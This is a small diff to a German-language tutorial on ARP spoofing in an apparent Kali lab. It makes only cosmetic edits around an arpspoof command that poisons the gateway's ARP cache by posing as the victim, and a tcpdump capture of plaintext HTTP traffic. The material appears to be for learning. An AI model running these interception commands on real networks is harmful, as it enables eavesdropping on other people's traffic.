@@ -51,9 +51,7 @@ Herausfinden des router (=default gateway)
 $ route -n
 ```
 
-Schickt einen ARP Response an das Gateway. 
-
-Folgendes gaukelt dem Gateway vor wir sind das Opfer:
+Folgendes gaukelt dem Gateway vor wir sind das Opfer (Schickt einen ARP Response an das Gateway):
 
 ```sh
 $ arpspoof -i eth0 -t 10.0.2.1 10.0.2.7 
@@ -196,7 +194,7 @@ Schnittstelle: 192.168.178.75 --- 0xc
 Auf Hacker (Kali)
 
 ```sh
-tcpdump -nA port 80
+$ tcpdump -nA port 80
 tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
 listening on eth0, link-type EN10MB (Ethernet), snapshot length 262144 bytes
 
